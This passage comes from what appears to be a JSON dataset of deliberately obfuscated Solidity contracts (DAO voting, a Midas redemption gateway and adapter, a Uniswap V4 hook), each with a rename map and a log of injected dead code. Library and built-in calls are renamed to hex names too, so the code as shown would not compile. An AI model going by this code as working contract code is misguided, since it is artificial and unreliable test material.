the existing voting power (or the same) is not allowed\n            if (_0x8a0930 <= _0xe35e9d) {\n                return false;\n            }\n            // The voter already voted a different option but vote replacment is not allowed.\n            else if (\n                _0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 != VoteOption.None\n                    && _0x16bd0a != _0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3\n            ) {\n                return false;\n            }\n        }\n        // Vote replacement mode\n        else {\n            // Lowering the existing voting power is not allowed\n            if (_0x8a0930 == 0 || _0x8a0930 < _0xe35e9d) {\n                return false;\n            }\n            // Voting the same option with the same balance is not allowed\n            else if (_0x8a0930 == _0xe35e9d && _0x16bd0a == _0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    function _0x7545fa(uint256 _0x44e96c, address _0x7bf565) internal {\n        if (!_0x01df2e(_0x44e96c)) {\n            return;\n        } else if (!_0x015c98()._0x41b231(address(this), _0x7bf565, EXECUTE_PROPOSAL_PERMISSION_ID, _0x3fa189())) {\n            return;\n        }\n\n        _0x293954(_0x44e96c);\n    }\n\n    function _0x293954(uint256 _0x44e96c) internal override {\n        super._0x293954(_0x44e96c);\n\n        // Notify the LockManager to stop tracking this proposal ID\n        _0xff69d3._0x64744e(_0x44e96c);\n    }\n\n    /// @notice This empty reserved space is put in place to allow future versions to add\n    /// new variables without shifting down storage in the inheritance chain\n    /// (see [OpenZeppelin's guide about storage gaps]\n    /// (https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)).\n    uint256[50] private __gap;\n}\n",
      "rename_map": {
        "onlyCallAtInitialization": "_0x8d2f91",
        "customProposalParamsABI": "_0xd8701a",
        "minProposerVotingPower": "_0x5774f3",
        "_attemptEarlyExecution": "_0x7545fa",
        "_validateProposalDates": "_0xda7573",
        "supportThresholdRatio": "_0x3f3404",
        "minParticipationRatio": "_0xf3263f",
        "_currentVotingPower": "_0xe35e9d",
        "currentTokenSupply": "_0xc7a3d6",
        "_createProposalId": "_0x2112c6",
        "supportsInterface": "_0xd36c86",
        "definingContract": "_0x8b1def",
        "minApprovalRatio": "_0xe91abe",
        "_allowFailureMap": "_0x96aaac",
        "getLockedBalance": "_0xde5e8e",
        "_votingSettings": "_0x6722fc",
        "_proposalExists": "_0x7c0ddb",
        "_newVotingPower": "_0x8a0930",
        "getTargetConfig": "_0xbd910c",
        "usedVotingPower": "_0x68870f",
        "_isProposalOpen": "_0x4f9109",
        "proposalCreated": "_0x4a0bc9",
        "_pluginMetadata": "_0x726c70",
        "allowFailureMap": "_0x8df0ba",
        "isProposalOpen": "_0xba7733",
        "createProposal": "_0xd38687",
        "proposalEnded": "_0x64744e",
        "_targetConfig": "_0x961199",
        "hasPermission": "_0x41b231",
        "reinitializer": "_0xfb7e51",
        "_lockManager": "_0x8da029",
        "_interfaceId": "_0x587156",
        "targetConfig": "_0x230818",
        "_canExecute": "_0x01df2e",
        "_voteCaller": "_0x7bf565",
        "_proposalId": "_0x44e96c",
        "interfaceId": "_0x90c273",
        "_voteOption": "_0x16bd0a",
        "totalSupply": "_0x008020",
        "lockManager": "_0xff69d3",
        "votingPower": "_0x25f743",
        "proposalId": "_0x19fbf7",
        "parameters": "_0x90b24f",
        "voteOption": "_0x34e9b3",
        "votingMode": "_0xf3849c",
        "_msgSender": "_0x94ca1b",
        "_startDate": "_0x7dbd1a",
        "initialize": "_0xd9d971",
        "proposals": "_0x83ae78",
        "startDate": "_0xefd224",
        "_metadata": "_0xbac8f5",
        "proposal_": "_0x0a81e2",
        "clearVote": "_0x715d8c",
        "keccak256": "_0xdc56a8",
        "_canVote": "_0x57b7ea",
        "_execute": "_0x293954",
        "_endDate": "_0xc7d879",
        "_msgData": "_0x3fa189",
        "_actions": "_0xf27e27",
        "abstain": "_0x8cbc2e",
        "actions": "_0x8bdcec",
        "canVote": "_0xb2ec59",
        "endDate": "_0x4349b5",
        "decode": "_0xf1d42b",
        "encode": "_0x913bd1",
        "_voter": "_0xae3fcb",
        "tally": "_0xc4b6ad",
        "voter": "_0xa7c3a7",
        "token": "_0xa9e908",
        "votes": "_0x5c66fb",
        "_data": "_0xe8461d",
        "diff": "_0xe71137",
        "auth": "_0x20505a",
        "vote": "_0x49ed41",
        "_dao": "_0x080646",
        "yes": "_0x4848c9",
        "dao": "_0x015c98",
        "no": "_0x7ef10c"
      },
      "changes": [
        "Renamed 78 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_019",
      "transformed_id": "ss_l4_medium_sn_gs_019",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: GPL-2.0-or-later\n// Gearbox Protocol. Generalized leverage for DeFi protocols\n// (c) Gearbox Foundation, 2024.\npragma solidity ^0.8.23;\n\nimport {ReentrancyGuardTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ReentrancyGuardTrait.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IMidasRedemptionVault} from \"../../integrations/midas/IMidasRedemptionVault.sol\";\nimport {IMidasRedemptionVaultGateway} from \"../../interfaces/midas/IMidasRedemptionVaultGateway.sol\";\n\n/// @title Midas Redemption Vault Gateway\n/// @notice Gateway contract that manages redemptions from Midas vault on behalf of users\n/// @dev Stores pending redemption requests and handles partial withdrawals\ncontract MidasRedemptionVaultGateway is ReentrancyGuardTrait, IMidasRedemptionVaultGateway {\n    using SafeERC20 for IERC20;\n\n    bytes32 public constant override _0x1e3518 = \"GATEWAY::MIDAS_REDEMPTION_VAULT\";\n    uint256 public constant override _0xcc743c = 3_10;\n\n    address public immutable _0x12af9f;\n    address public immutable _0x3fe13b;\n\n    mapping(address => PendingRedemption) public _0xb3b3aa;\n\n    /// @notice Constructor\n    /// @param _midasRedemptionVault Address of the Midas Redemption Vault\n    constructor(address _0xb21d42) {\n        _0x12af9f = _0xb21d42;\n        _0x3fe13b = IMidasRedemptionVault(_0xb21d42)._0x3fe13b();\n    }\n\n    /// @notice Performs instant redemption of mToken for output token\n    /// @param tokenOut Output token to receive\n    /// @param amountMTokenIn Amount of mToken to redeem\n    /// @param minReceiveAmount Minimum amount of output token to receive\n    /// @dev Transfers mToken from sender, redeems, and transfers output token back\n    function _0x452870(address _0xb06570, uint256 _0x72a68e, uint256 _0x37be89) external _0x9eed0a {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n        IERC20(_0x3fe13b)._0xe521a8(msg.sender, address(this), _0x72a68e);\n\n        uint256 _0x994849 = IERC20(_0xb06570)._0x12cea2(address(this));\n\n        IERC20(_0x3fe13b)._0x780b10(_0x12af9f, _0x72a68e);\n        IMidasRedemptionVault(_0x12af9f)._0x452870(_0xb06570, _0x72a68e, _0x37be89);\n\n        uint256 _0xff20e2 = IERC20(_0xb06570)._0x12cea2(address(this)) - _0x994849;\n\n        IERC20(_0xb06570)._0xe7e2b6(msg.sender, _0xff20e2);\n    }\n\n    /// @notice Requests a redemption of mToken for output token\n    /// @param tokenOut Output token to receive\n    /// @param amountMTokenIn Amount of mToken to redeem\n    /// @dev Stores the request ID and timestamp for tracking\n    function _0x3e8aa1(address _0xb06570, uint256 _0x72a68e) external _0x9eed0a {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if (_0xb3b3aa[msg.sender]._0xd17c2a) {\n            revert(\"MidasRedemptionVaultGateway: user has a pending redemption\");\n        }\n\n        uint256 _0x2b9973 = IMidasRedemptionVault(_0x12af9f)._0x6b769a();\n\n        IERC20(_0x3fe13b)._0xe521a8(msg.sender, address(this), _0x72a68e);\n\n        IERC20(_0x3fe13b)._0x780b10(_0x12af9f, _0x72a68e);\n        IMidasRedemptionVault(_0x12af9f)._0x8b918a(_0xb06570, _0x72a68e);\n\n        _0xb3b3aa[msg.sender] =\n            PendingRedemption({_0xd17c2a: true, _0x2b9973: _0x2b9973, timestamp: block.timestamp, _0x3d0efe: 0});\n    }\n\n    /// @notice Withdraws tokens from a fulfilled redemption request\n    /// @param amount Amount of output token to withdraw\n    /// @dev Supports partial withdrawals by tracking remainder\n    function _0xcd9ba7(uint256 _0xff20e2) external _0x9eed0a {\n        PendingRedemption memory _0xc54ad4 = _0xb3b3aa[msg.sender];\n\n        if (!_0xc54ad4._0xd17c2a) {\n            revert(\"MidasRedemptionVaultGateway: user does not have a pending redemption\");\n        }\n\n        (\n            address sender,\n            address _0xb06570,\n            uint8 _0xb6c0ac,\n            uint256 _0x72a68e,\n            uint256 _0x3238ac,\n            uint256 _0xb869f3\n        ) = IMidasRedemptionVault(_0x12af9f)._0xdef1c6(_0xc54ad4._0x2b9973);\n\n        if (sender != address(this)) {\n            revert(\"MidasRedemptionVaultGateway: invalid request\");\n        }\n\n        if (_0xb6c0ac != 1) {\n            revert(\"MidasRedemptionVaultGateway: redemption not fulfilled\");\n        }\n\n        uint256 _0x3907b8;\n\n        if (_0xc54ad4._0x3d0efe > 0) {\n            if (block.timestamp > 0) { _0x3907b8 = _0xc54ad4._0x3d0efe; }\n        } else {\n            _0x3907b8 = _0xc502f2(_0x72a68e, _0x3238ac, _0xb869f3, _0xb06570);\n        }\n\n        if (_0xff20e2 > _0x3907b8) {\n            revert(\"MidasRedemptionVaultGateway: amount exceeds available\");\n        }\n\n        if (_0xff20e2 == _0x3907b8) {\n            delete _0xb3b3aa[msg.sender];\n        } else {\n            _0xb3b3aa[msg.sender]._0x3d0efe = _0x3907b8 - _0xff20e2;\n        }\n\n        IERC20(_0xb06570)._0xe7e2b6(msg.sender, _0xff20e2);\n    }\n\n    /// @notice Returns the expected amount of output token for a user's pending redemption\n    /// @param user User address to check\n    /// @param tokenOut Output token to check\n    /// @return Expected amount of output token, considering any partial withdrawals\n    function _0x5d186c(address _0x906563, address _0xb06570) external view returns (uint256) {\n        PendingRedemption memory _0xc54ad4 = _0xb3b3aa[_0x906563];\n\n        if (!_0xc54ad4._0xd17c2a) {\n            return 0;\n        }\n\n        (address sender, address _0x3056b7,, uint256 _0x72a68e, uint256 _0x3238ac, uint256 _0xb869f3) =\n            IMidasRedemptionVault(_0x12af9f)._0xdef1c6(_0xc54ad4._0x2b9973);\n\n        if (sender != address(this) || _0x3056b7 != _0xb06570) {\n            return 0;\n        }\n\n        if (_0xc54ad4._0x3d0efe > 0) {\n            return _0xc54ad4._0x3d0efe;\n        } else {\n            return _0xc502f2(_0x72a68e, _0x3238ac, _0xb869f3, _0xb06570);\n        }\n    }\n\n    /// @dev Calculates the output token amount from mToken amount and rates\n    /// @param amountMTokenIn Amount of mToken\n    /// @param mTokenRate Rate of mToken\n    /// @param tokenOutRate Rate of output token\n    /// @param tokenOut Address of output token\n    /// @return Amount of output token in its native decimals\n    function _0xc502f2(\n        uint256 _0x72a68e,\n        uint256 _0x3238ac,\n        uint256 _0xb869f3,\n        address _0xb06570\n    ) internal view returns (uint256) {\n        uint256 _0x68f0be = (_0x72a68e * _0x3238ac) / _0xb869f3;\n\n        uint256 _0x59bc95 = 10 ** IERC20Metadata(_0xb06570)._0xb3d808();\n\n        return _0x68f0be * _0x59bc95 / 1e18;\n    }\n}",
      "rename_map": {
        "_calculateTokenOutAmount": "_0xc502f2",
        "pendingTokenOutAmount": "_0x5d186c",
        "_midasRedemptionVault": "_0xb21d42",
        "midasRedemptionVault": "_0x12af9f",
        "pendingRedemptions": "_0xb3b3aa",
        "safeTransferFrom": "_0xe521a8",
        "currentRequestId": "_0x6b769a",
        "minReceiveAmount": "_0x37be89",
        "availableAmount": "_0x3907b8",
        "requestTokenOut": "_0x3056b7",
        "redeemRequests": "_0xdef1c6",
        "amountMTokenIn": "_0x72a68e",
        "redeemInstant": "_0x452870",
        "balanceBefore": "_0x994849",
        "requestRedeem": "_0x3e8aa1",
        "redeemRequest": "_0x8b918a",
        "contractType": "_0x1e3518",
        "safeTransfer": "_0xe7e2b6",
        "forceApprove": "_0x780b10",
        "nonReentrant": "_0x9eed0a",
        "tokenOutRate": "_0xb869f3",
        "amount1e18": "_0x68f0be",
        "mTokenRate": "_0x3238ac",
        "remainder": "_0x3d0efe",
        "balanceOf": "_0x12cea2",
        "requestId": "_0x2b9973",
        "tokenUnit": "_0x59bc95",
        "tokenOut": "_0xb06570",
        "withdraw": "_0xcd9ba7",
        "isActive": "_0xd17c2a",
        "decimals": "_0xb3d808",
        "version": "_0xcc743c",
        "pending": "_0xc54ad4",
        "amount": "_0xff20e2",
        "status": "_0xb6c0ac",
        "mToken": "_0x3fe13b",
        "user": "_0x906563"
      },
      "changes": [
        "Renamed 37 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_020",
      "transformed_id": "ss_l4_medium_sn_gs_020",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: GPL-2.0-or-later\n// Gearbox Protocol. Generalized leverage for DeFi protocols\n// (c) Gearbox Foundation, 2024.\npragma solidity ^0.8.23;\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/interfaces/IERC20Metadata.sol\";\nimport {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\n\nimport {AbstractAdapter} from \"../AbstractAdapter.sol\";\nimport {NotImplementedException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\n\nimport {IMidasRedemptionVault} from \"../../integrations/midas/IMidasRedemptionVault.sol\";\nimport {IMidasRedemptionVaultAdapter} from \"../../interfaces/midas/IMidasRedemptionVaultAdapter.sol\";\nimport {IMidasRedemptionVaultGateway} from \"../../interfaces/midas/IMidasRedemptionVaultGateway.sol\";\n\nimport {WAD, RAY} from \"@gearbox-protocol/core-v3/contracts/libraries/Constants.sol\";\n\n/// @title Midas Redemption Vault adapter\n/// @notice Implements logic for interacting with the Midas Redemption Vault through a gateway\ncontract MidasRedemptionVaultAdapter is AbstractAdapter, IMidasRedemptionVaultAdapter {\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    bytes32 public constant override _0xd42720 = \"ADAPTER::MIDAS_REDEMPTION_VAULT\";\n    uint256 public constant override _0x9f0197 = 3_10;\n\n    /// @notice mToken\n    address public immutable override _0xcc3c3e;\n\n    /// @notice Gateway address\n    address public immutable override _0x240a5b;\n\n    /// @notice Mapping from phantom token to its tracked output token\n    mapping(address => address) public _0x0eca32;\n\n    /// @notice Mapping from output token to its tracked phantom token\n    mapping(address => address) public _0x013e7e;\n\n    /// @dev Set of allowed output tokens for redemptions\n    EnumerableSet.AddressSet internal _0x4ea4ea;\n\n    /// @notice Constructor\n    /// @param _creditManager Credit manager address\n    /// @param _gateway Midas Redemption Vault gateway address\n    constructor(address _0x6347f0, address _0x218bbe) AbstractAdapter(_0x6347f0, _0x218bbe) {\n        if (block.timestamp > 0) { _0x240a5b = _0x218bbe; }\n        _0xcc3c3e = IMidasRedemptionVaultGateway(_0x218bbe)._0xcc3c3e();\n\n        _0x977ede(_0xcc3c3e);\n    }\n\n    /// @notice Instantly redeems mToken for output token\n    /// @param tokenOut Output token address\n    /// @param amountMTokenIn Amount of mToken to redeem\n    /// @param minReceiveAmount Minimum amount of output token to receive\n    function _0xdee002(address _0x440d76, uint256 _0x20b81d, uint256 _0x106ed7)\n        external\n        override\n        _0x01c88f\n        returns (bool)\n    {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        if (!_0xd62117(_0x440d76)) revert TokenNotAllowedException();\n\n        _0x67660b(_0x440d76, _0x20b81d, _0x106ed7);\n\n        return false;\n    }\n\n    /// @notice Instantly redeems the entire balance of mToken for output token, except the specified amount\n    /// @param tokenOut Output token address\n    /// @param leftoverAmount Amount of mToken to keep in the account\n    /// @param rateMinRAY Minimum exchange rate from input token to mToken (in RAY format)\n    function _0x38cde0(address _0x440d76, uint256 _0x4ac064, uint256 _0x03246a)\n        external\n        override\n        _0x01c88f\n        returns (bool)\n    {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        if (!_0xd62117(_0x440d76)) revert TokenNotAllowedException();\n\n        address _0xc73697 = _0xbfd36f();\n\n        uint256 balance = IERC20(_0xcc3c3e)._0x1f5f45(_0xc73697);\n        if (balance > _0x4ac064) {\n            unchecked {\n                uint256 _0x8635ab = balance - _0x4ac064;\n                uint256 _0x106ed7 = (_0x8635ab * _0x03246a) / RAY;\n                _0x67660b(_0x440d76, _0x8635ab, _0x106ed7);\n            }\n        }\n        return false;\n    }\n\n    /// @dev Internal implementation of redeemInstant\n    function _0x67660b(address _0x440d76, uint256 _0x20b81d, uint256 _0x106ed7) internal {\n        _0x0e25b7(\n            _0xcc3c3e,\n            abi._0x6bd34d(\n                IMidasRedemptionVaultGateway._0xdee002,\n                (_0x440d76, _0x20b81d, _0x472d78(_0x106ed7, _0x440d76))\n            )\n        );\n    }\n\n    /// @notice Requests a redemption of mToken for output token\n    /// @param tokenOut Output token address\n    /// @param amountMTokenIn Amount of mToken to redeem\n    /// @dev Returns `true` to allow safe pricing for the withdrawal phantom token\n    function _0xa9c66c(address _0x440d76, uint256 _0x20b81d)\n        external\n        override\n        _0x01c88f\n        returns (bool)\n    {\n        if (!_0xd62117(_0x440d76) || _0x013e7e[_0x440d76] == address(0)) {\n            revert TokenNotAllowedException();\n        }\n\n        _0x0e25b7(\n            _0xcc3c3e, abi._0x6bd34d(IMidasRedemptionVaultGateway._0x09a314, (_0x440d76, _0x20b81d))\n        );\n        return true;\n    }\n\n    /// @notice Withdraws redeemed tokens from the gateway\n    /// @param amount Amount to withdraw\n    function _0xb09291(uint256 _0x8635ab) external override _0x01c88f returns (bool) {\n        _0x95043e(_0x8635ab);\n        return false;\n    }\n\n    /// @dev Internal implementation of withdraw\n    function _0x95043e(uint256 _0x8635ab) internal {\n        _0xa94118(abi._0x6bd34d(IMidasRedemptionVaultGateway._0xb09291, (_0x8635ab)));\n    }\n\n    /// @notice Withdraws phantom token balance\n    /// @param token Phantom token address\n    /// @param amount Amount to withdraw\n    function _0xe504ff(address _0xb2b0d1, uint256 _0x8635ab) external override _0x01c88f returns (bool) {\n        if (_0x0eca32[_0xb2b0d1] == address(0)) revert IncorrectStakedPhantomTokenException();\n        _0x95043e(_0x8635ab);\n        return false;\n    }\n\n    /// @notice Deposits phantom token (not implemented for redemption vaults)\n    /// @return Never returns (always reverts)\n    /// @dev Redemption vaults only support withdrawals, not deposits\n    function _0x08c680(address, uint256) external pure override returns (bool) {\n        revert NotImplementedException();\n    }\n\n    /// @dev Converts the token amount to 18 decimals, which is accepted by Midas\n    function _0x472d78(uint256 _0x8635ab, address _0xb2b0d1) internal view returns (uint256) {\n        uint256 _0x34d62a = 10 ** IERC20Metadata(_0xb2b0d1)._0xad46f7();\n        return _0x8635ab * WAD / _0x34d62a;\n    }\n\n    /// @notice Returns whether a token is allowed as output for redemptions\n    /// @param token Token address to check\n    /// @return True if token is allowed\n    function _0xd62117(address _0xb2b0d1) public view override returns (bool) {\n        return _0x4ea4ea._0xe4c9cd(_0xb2b0d1);\n    }\n\n    /// @notice Returns all allowed output tokens\n    /// @return Array of allowed token addresses\n    function _0x8ad6db() public view override returns (address[] memory) {\n        return _0x4ea4ea._0xd6b532();\n    }\n\n    /// @notice Sets the allowed status for a batch of output tokens\n    /// @param configs Array of MidasAllowedTokenStatus structs\n    /// @dev Can only be called by the configurator\n    function _0xf6f78a(MidasAllowedTokenStatus[] calldata _0x1eae6d)\n        external\n        override\n        _0x8019d8\n    {\n        uint256 _0x4195dc = _0x1eae6d.length;\n\n        for (uint256 i; i < _0x4195dc; ++i) {\n            MidasAllowedTokenStatus memory _0x1c0b9a = _0x1eae6d[i];\n\n            if (_0x1c0b9a._0x130b17) {\n                _0x977ede(_0x1c0b9a._0xb2b0d1);\n                _0x4ea4ea._0xed8e77(_0x1c0b9a._0xb2b0d1);\n\n                if (_0x1c0b9a._0x69e261 != address(0)) {\n                    _0x977ede(_0x1c0b9a._0x69e261);\n                    _0x0eca32[_0x1c0b9a._0x69e261] = _0x1c0b9a._0xb2b0d1;\n                    _0x013e7e[_0x1c0b9a._0xb2b0d1] = _0x1c0b9a._0x69e261;\n                }\n            } else {\n                _0x4ea4ea._0x91dd5c(_0x1c0b9a._0xb2b0d1);\n\n                address _0x69e261 = _0x013e7e[_0x1c0b9a._0xb2b0d1];\n\n                if (_0x69e261 != address(0)) {\n                    delete _0x013e7e[_0x1c0b9a._0xb2b0d1];\n                    delete _0x0eca32[_0x69e261];\n                }\n            }\n\n            emit SetTokenAllowedStatus(_0x1c0b9a._0xb2b0d1, _0x1c0b9a._0x69e261, _0x1c0b9a._0x130b17);\n        }\n    }\n\n    /// @notice Serialized adapter parameters\n    /// @return serializedData Encoded adapter configuration\n    function _0x6dc14e() external view returns (bytes memory _0xf76202) {\n        if (1 == 1) { _0xf76202 = abi._0xd9b2f3(_0x585466, _0x70ab0f, _0x240a5b, _0xcc3c3e, _0x8ad6db()); }\n    }\n}",
      "rename_map": {
        "setTokenAllowedStatusBatch": "_0xf6f78a",
        "outputTokenToPhantomToken": "_0x013e7e",
        "phantomTokenToOutputToken": "_0x0eca32",
        "_executeSwapSafeApprove": "_0x0e25b7",
        "withdrawPhantomToken": "_0xe504ff",
        "depositPhantomToken": "_0x08c680",
        "redeemInstantDiff": "_0x38cde0",
        "configuratorOnly": "_0x8019d8",
        "minReceiveAmount": "_0x106ed7",
        "creditFacadeOnly": "_0x01c88f",
        "_getMaskOrRevert": "_0x977ede",
        "targetContract": "_0x70ab0f",
        "_creditAccount": "_0xbfd36f",
        "serializedData": "_0xf76202",
        "_allowedTokens": "_0x4ea4ea",
        "_redeemInstant": "_0x67660b",
        "amountMTokenIn": "_0x20b81d",
        "_creditManager": "_0x6347f0",
        "leftoverAmount": "_0x4ac064",
        "isTokenAllowed": "_0xd62117",
        "_convertToE18": "_0x472d78",
        "creditManager": "_0x585466",
        "redeemInstant": "_0xdee002",
        "allowedTokens": "_0x8ad6db",
        "creditAccount": "_0xc73697",
        "requestRedeem": "_0x09a314",
        "redeemRequest": "_0xa9c66c",
        "phantomToken": "_0x69e261",
        "contractType": "_0xd42720",
        "encodeCall": "_0x6bd34d",
        "rateMinRAY": "_0x03246a",
        "_withdraw": "_0x95043e",
        "balanceOf": "_0x1f5f45",
        "serialize": "_0x6dc14e",
        "tokenUnit": "_0x34d62a",
        "_gateway": "_0x218bbe",
        "tokenOut": "_0x440d76",
        "withdraw": "_0xb09291",
        "_execute": "_0xa94118",
        "contains": "_0xe4c9cd",
        "decimals": "_0xad46f7",
        "version": "_0x9f0197",
        "gateway": "_0x240a5b",
        "configs": "_0x1eae6d",
        "allowed": "_0x130b17",
        "amount": "_0x8635ab",
        "values": "_0xd6b532",
        "remove": "_0x91dd5c",
        "encode": "_0xd9b2f3",
        "config": "_0x1c0b9a",
        "mToken": "_0xcc3c3e",
        "token": "_0xb2b0d1",
        "add": "_0xed8e77",
        "len": "_0x4195dc"
      },
      "changes": [
        "Renamed 54 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_021",
      "transformed_id": "ss_l4_medium_sn_gs_021",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {BaseKEMHook} from './base/BaseKEMHook.sol';\nimport {IKEMHook} from './interfaces/IKEMHook.sol';\nimport {HookDataDecoder} from './libraries/HookDataDecoder.sol';\n\nimport {IHooks} from 'uniswap/v4-core/src/interfaces/IHooks.sol';\nimport {IPoolManager} from 'uniswap/v4-core/src/interfaces/IPoolManager.sol';\nimport {IUnlockCallback} from 'uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';\nimport {Hooks} from 'uniswap/v4-core/src/libraries/Hooks.sol';\n\nimport {BalanceDelta, _0xcbd237} from 'uniswap/v4-core/src/types/BalanceDelta.sol';\nimport {\n  BeforeSwapDelta, BeforeSwapDeltaLibrary\n} from 'uniswap/v4-core/src/types/BeforeSwapDelta.sol';\nimport {Currency} from 'uniswap/v4-core/src/types/Currency.sol';\nimport {PoolId} from 'uniswap/v4-core/src/types/PoolId.sol';\nimport {PoolKey} from 'uniswap/v4-core/src/types/PoolKey.sol';\n\nimport {SignatureChecker} from\n  'openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol';\n\n/// @title UniswapV4KEMHook\ncontract UniswapV4KEMHook is BaseKEMHook, IUnlockCallback {\n  /// @notice Thrown when the caller is not PoolManager\n  error NotPoolManager();\n\n  /// @notice The address of the PoolManager contract\n  IPoolManager public immutable _0x32ec4a;\n\n  constructor(\n    IPoolManager _0xe2c129,\n    address _0xa77e96,\n    address[] memory _0x675d25,\n    address _0x8b31e9,\n    address _0xef4bd5\n  ) BaseKEMHook(_0xa77e96, _0x675d25, _0x8b31e9, _0xef4bd5) {\n    _0x32ec4a = _0xe2c129;\n    Hooks._0x937491(IHooks(address(this)), _0xc72b97());\n  }\n\n  /// @notice Only allow calls from the PoolManager contract\n  modifier _0xfc019b() {\n    if (msg.sender != address(_0x32ec4a)) revert NotPoolManager();\n    _;\n  }\n\n  /// @inheritdoc IKEMHook\n  function _0xb26b49(address[] calldata _0x50c327, uint256[] calldata _0x3226b1) public {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n    require(_0x86c3bf[msg.sender], NonClaimableAccount(msg.sender));\n    require(_0x50c327.length == _0x3226b1.length, MismatchedArrayLengths());\n\n    _0x32ec4a._0x1d3c53(abi._0xf761ac(_0x50c327, _0x3226b1));\n  }\n\n  function _0x98f3d0(bytes calldata data) public _0xfc019b returns (bytes memory) {\n        bool _flag3 = false;\n        bool _flag4 = false;\n    (address[] memory _0x50c327, uint256[] memory _0x3226b1) = abi._0x597e91(data, (address[], uint256[]));\n\n    for (uint256 i = 0; i < _0x50c327.length; i++) {\n      uint256 _0xfb8cff = uint256(uint160(_0x50c327[i]));\n      if (_0x3226b1[i] == 0) {\n        _0x3226b1[i] = _0x32ec4a._0x48adcd(address(this), _0xfb8cff);\n      }\n      if (_0x3226b1[i] > 0) {\n        _0x32ec4a._0x0a0c54(address(this), _0xfb8cff, _0x3226b1[i]);\n        _0x32ec4a._0x58e9f2(Currency._0x575f0e(_0x50c327[i]), _0x4bea19, _0x3226b1[i]);\n      }\n    }\n\n    emit ClaimEgTokens(_0x4bea19, _0x50c327, _0x3226b1);\n  }\n\n  function _0xc72b97() public pure returns (Hooks.Permissions memory) {\n    return Hooks.Permissions({\n      _0x5931d1: false,\n      _0x7d1f82: false,\n      _0x461249: false,\n      _0x1d148b: false,\n      _0x0e19f6: false,\n      _0xae533d: false,\n      _0x1e7041: true,\n      _0xe27ad3: true,\n      _0x140dac: false,\n      _0x2012d6: false,\n      _0x04dcd4: false,\n      _0x575f5f: true,\n      _0x1fafa1: false,\n      _0x468e7a: false\n    });\n  }\n\n  function _0x1e7041(\n    address sender,\n    PoolKey calldata _0x5fdaf3,\n    IPoolManager.SwapParams calldata _0xd6290e,\n    bytes calldata _0x5fd13d\n  ) external _0xfc019b returns (bytes4, BeforeSwapDelta, uint24) {\n    require(_0xd6290e._0x53e6ef < 0, ExactOutputDisabled());\n\n    (\n      int256 _0x52d412,\n      int256 _0xf81fc4,\n      int256 _0x997335,\n      uint256 _0x7a446b,\n      uint256 _0x2def6d,\n      bytes memory _0xa9588c\n    ) = HookDataDecoder._0x0b7c58(_0x5fd13d);\n\n    require(block.timestamp <= _0x2def6d, ExpiredSignature(_0x2def6d, block.timestamp));\n    require(\n      -_0xd6290e._0x53e6ef <= _0x52d412,\n      ExceededMaxAmountIn(_0x52d412, -_0xd6290e._0x53e6ef)\n    );\n\n    _0xbe46f1(_0x7a446b);\n\n    bytes32 _0x6f0e4a = _0xb06f04(\n      abi._0xf761ac(\n        sender,\n        _0x5fdaf3,\n        _0xd6290e._0x9720a1,\n        _0x52d412,\n        _0xf81fc4,\n        _0x997335,\n        _0x7a446b,\n        _0x2def6d\n      )\n    );\n    require(\n      SignatureChecker._0xe0da4c(_0xf76483, _0x6f0e4a, _0xa9588c), InvalidSignature()\n    );\n\n    return (this._0x1e7041.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);\n  }\n\n  function _0xe27ad3(\n    address,\n    PoolKey calldata _0x5fdaf3,\n    IPoolManager.SwapParams calldata _0xd6290e,\n    BalanceDelta _0xc59d8d,\n    bytes calldata _0x5fd13d\n  ) external _0xfc019b returns (bytes4, int128) {\n    (int256 _0xf81fc4, int256 _0x997335) =\n      HookDataDecoder._0x9bdbc1(_0x5fd13d);\n\n    int128 _0x6d1ebb;\n    int128 _0xfa5e52;\n    Currency _0x3816f3;\n    unchecked {\n      if (_0xd6290e._0x9720a1) {\n        _0x6d1ebb = -_0xc59d8d._0x792ede();\n        _0xfa5e52 = _0xc59d8d._0x62dd81();\n        _0x3816f3 = _0x5fdaf3._0x9e7a73;\n      } else {\n        _0x6d1ebb = -_0xc59d8d._0x62dd81();\n        _0xfa5e52 = _0xc59d8d._0x792ede();\n        _0x3816f3 = _0x5fdaf3._0xbcc19d;\n      }\n    }\n\n    int256 _0xaf2a62 = _0x6d1ebb * _0xf81fc4 / _0x997335;\n\n    unchecked {\n      int256 